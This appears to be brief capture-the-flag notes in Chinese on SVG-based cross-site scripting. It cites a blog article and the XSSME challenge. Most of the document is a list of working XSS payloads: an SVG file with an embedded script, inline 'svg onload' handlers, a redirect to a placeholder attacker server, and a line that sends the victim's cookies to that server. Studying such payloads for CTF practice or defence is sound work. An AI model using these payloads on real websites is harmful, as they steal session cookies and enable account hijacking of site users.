# 文章
[浅谈SVG的两个黑魔法 - 合天网安实验室 - 博客园](https://www.cnblogs.com/hetianlab/p/14067692.html)
### 例题
XSSME<br />题目地址：[https://xssrf.hackme.inndy.tw/](https://xssrf.hackme.inndy.tw/)
### Payload
```powershell
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
   <circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="red" />
   <script>alert(1)</script>
</svg>
```
```powershell
<svg/onload=alert(1)>
<svg/onload="document.location='http://vps-ip:1234'">
<svg/onload="document.location='http://vps-ip:1234/?'+document.cookie">
```
